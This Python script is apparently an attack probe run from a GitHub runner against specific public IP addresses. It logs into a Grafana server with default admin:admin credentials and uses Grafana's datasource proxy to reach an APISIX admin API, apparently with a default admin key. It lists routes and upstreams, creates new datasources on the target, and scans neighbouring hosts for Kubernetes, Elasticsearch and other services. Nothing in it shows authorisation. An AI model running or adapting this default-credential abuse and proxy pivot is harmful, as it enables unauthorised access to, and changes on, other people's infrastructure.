#!/usr/bin/env python3
"""i4652 probe: APISIX .205 admin reachability from a GitHub runner + Grafana datasource-proxy chain."""
import json, time, base64, urllib.request, urllib.error, sys

AUTH = "Basic " + base64.b64encode(b"admin:admin").decode()
G = "http://117.148.167.134:3000"
DS = "e8f0765b-e209-4c28-aae4-2345c21abeda"
KEY = "edd1c9f034335f136f87ad84b625c8f1"

def req(url, hdrs=None, to=12, method="GET", data=None):
    r = urllib.request.Request(url, headers=dict(hdrs or {}), data=data, method=method)
    t0 = time.time()
    try:
        x = urllib.request.urlopen(r, timeout=to)
        b = x.read(8000).decode("utf-8", "replace")
        return {"code": x.status, "ms": int((time.time()-t0)*1000), "body": b[:4000]}
    except urllib.error.HTTPError as e:
        try: b = e.read()[:2000].decode("utf-8", "replace")
        except Exception: b = ""
        return {"code": e.code, "ms": int((time.time()-t0)*1000), "body": b}
    except Exception as e:
        return {"err": type(e).__name__ + ":" + str(e)[:160], "ms": int((time.time()-t0)*1000)}

def show(label, res):
    print("### " + label, flush=True)
    print(json.dumps(res)[:4500], flush=True)

print("EGRESS", req("https://api.ipify.org", to=10).get("body"), flush=True)

# 1. direct reachability of APISIX admin from runner
show("direct_9180_root", req("http://117.148.167.205:9180/", to=6))
show("direct_9180_routes_key", req("http://117.148.167.205:9180/apisix/admin/routes", {"X-API-KEY": KEY}, to=6))
show("direct_gw80_admin", req("http://117.148.167.205/apisix/admin/routes", {}, to=6))

# 2. Grafana reachability + auth
show("grafana_health", req(G + "/api/health", to=12))
gu = req(G + "/api/user", {"Authorization": AUTH}, to=12)
show("grafana_user", gu)

if gu.get("code") == 200:
    show("ds_info", req(G + "/api/datasources/uid/" + DS, {"Authorization": AUTH}, to=12))
    show("proxy_routes", req(G + "/api/datasources/proxy/uid/" + DS + "/apisix/admin/routes", {"Authorization": AUTH}, to=20))
    show("proxy_upstreams", req(G + "/api/datasources/proxy/uid/" + DS + "/apisix/admin/upstreams", {"Authorization": AUTH}, to=20))
    show("proxy_admin_root", req(G + "/api/datasources/proxy/uid/" + DS + "/", {"Authorization": AUTH}, to=20))
    # create an extra datasource pointing at the gateway :80 and at 9091 to compare
    for name, url in [("ul_gw80", "http://117.148.167.205"), ("ul_9091", "http://117.148.167.205:9091")]:
        body = json.dumps({"name": name, "type": "prometheus", "access": "proxy", "url": url}).encode()
        show("create_" + name, req(G + "/api/datasources", {"Authorization": AUTH, "Content-Type": "application/json"}, to=15, method="POST", data=body))

# 3. other vantage checks from runner
for u in ["https://117.148.167.134:6443/version", "http://117.148.167.132:9200/", "http://117.148.167.133:8088/"]:
    show("reach_" + u, req(u, to=8))
print("DONE", flush=True)
